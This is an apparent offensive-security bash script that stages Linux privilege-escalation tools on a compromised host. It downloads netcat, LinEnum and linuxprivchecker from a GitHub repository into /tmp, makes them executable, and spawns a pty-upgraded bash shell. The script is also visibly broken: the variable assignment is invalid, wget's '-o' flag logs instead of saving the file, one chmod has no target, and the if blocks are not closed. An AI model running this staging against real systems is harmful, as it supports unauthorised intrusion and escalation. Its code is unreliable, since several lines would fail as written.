# used to stage all appropriate tools needed for privesc + handles some base config setup
# download this file using: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh

$stage = /tmp

# banner
echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
echo "[]_________________________________________________________________________________________[]"

# download NC
echo "[*] Downloadingf NC to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o $stage/nc
chmod +x $stage/nc

# download linenum.sh
echo "[*] Downloadingf linenum.sh to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -o $stage/linenum.sh
chmod +x $stage/linenum.sh

# download LinxPrivChecker.py
echo "[*] Downloadingf LinuxPrivChecker.sh to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o $stage/LPC.py
chmod +x 

# semi interactive shell
echo "[*] Attempting to build semi-interactive shell "
if command -v python &>/dev/null; then
    echo "-[*] Python availble, dropping semi-tty shell"
    python -c 'import pty;pty.spawn("/bin/bash");'
    
if command -v python3 &>/dev/null; then
    echo "-[*] Python 3 availble, dropping semi-tty shell"
    python3 -c 'import pty;pty.spawn("/bin/bash");' 
    
else
    echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method (may or may not work)"
    echo os.system('/bin/bash')
fi
echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"


